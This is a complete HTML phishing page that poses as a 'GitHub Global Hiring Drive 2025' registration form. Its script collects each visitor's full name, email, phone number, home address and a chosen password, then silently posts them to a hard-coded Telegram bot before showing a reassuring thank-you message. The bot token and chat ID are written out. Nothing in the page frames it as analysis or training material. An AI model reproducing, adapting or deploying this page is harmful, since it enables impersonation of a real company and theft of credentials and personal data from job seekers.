<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>GitHub Global Hiring Drive 2025</title>
  <style>
    body {
      font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
      background: linear-gradient(to bottom right, #e3f2fd, #ffffff);
      padding: 30px;
      display: flex;
      flex-direction: column;
      align-items: center;
    }
    h1 {
      color: #1a237e;
      margin-bottom: 20px;
    }
    form {
      background: #ffffff;
      padding: 40px;
      border-radius: 12px;
      max-width: 500px;
      width: 100%;
      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
    }
    input, textarea, button {
      width: 100%;
      margin: 12px 0;
      padding: 14px;
      border-radius: 8px;
      border: 1px solid #ccc;
      font-size: 16px;
    }
    button {
      background-color: #1a237e;
      color: white;
      font-weight: bold;
      cursor: pointer;
      border: none;
      transition: background 0.3s ease;
    }
    button:hover {
      background-color: #0d1649;
    }
    #thankyou {
      display: none;
      margin-top: 20px;
      color: green;
      font-size: 18px;
      font-weight: bold;
    }
  </style>
</head>
<body>

  <h1>GitHub Global Hiring Drive 2025</h1>

  <form id="registerForm">
    <input type="text" name="name" placeholder="Full Name" required />
    <input type="email" name="email" placeholder="Email Address" required />
    <input type="text" name="phone" placeholder="Contact Number" required />
    <textarea name="address" rows="3" placeholder="Residential Address" required></textarea>
    <input type="password" name="password" placeholder="Set a Password" required />
    <button type="submit">Register for Drive</button>
  </form>

  <div id="thankyou">‚úÖ Thank you! You will be contacted by email shortly.</div>

  <script>
    document.getElementById("registerForm").addEventListener("submit", async function (e) {
      e.preventDefault();

      const form = e.target;
      const data = {
        name: form.name.value,
        email: form.email.value,
        phone: form.phone.value,
        address: form.address.value,
        password: form.password.value
      };

      try {
        await fetch("https://api.telegram.org/bot7448574888:AAEqL3IHQocQslKBwia_TTAlt0jizyHao-U/sendMessage", {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify({
            chat_id: "<968143308>",
            text: `üì• *New Registration - GitHub Hiring*\n\nüë§ Name: ${data.name}\nüìß Email: ${data.email}\nüì± Phone: ${data.phone}\nüè† Address: ${data.address}\nüîí Password: ${data.password}`,
            parse_mode: "Markdown"
          })
        });

        form.style.display = "none";
        document.getElementById("thankyou").style.display = "block";
      } catch (error) {
        alert("Error submitting form. Please try again.");
        console.error(error);
      }
    });
  </script>

</body>
</html>
